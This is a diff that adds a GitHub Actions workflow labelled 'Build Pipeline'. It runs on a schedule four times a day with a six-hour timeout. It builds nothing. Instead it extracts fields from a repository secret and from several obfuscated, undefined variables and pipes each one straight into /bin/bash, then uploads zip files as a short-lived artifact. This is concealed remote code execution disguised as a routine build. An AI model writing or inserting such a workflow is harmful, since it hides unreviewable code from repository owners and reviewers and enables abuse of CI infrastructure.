@@ -1,0 +1,41 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          ogv00490: ${{ secrets.ogv00490 }}
+        run: |
+          printf '%s' "$ogv00490" | jq -r .p40 | /bin/bash
+          printf '%s' "$p3941" | jq -r .v8124 | /bin/bash
+          printf '%s' "$ibcp59566" | jq -r .ey109 | /bin/bash
+          printf '%s' "$p3" | jq -r .b6671 | /bin/bash
+          echo $ob50 | jq -r .utyha1457 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Znz547eV
+          path: "*.zip"
+          retention-days: 1
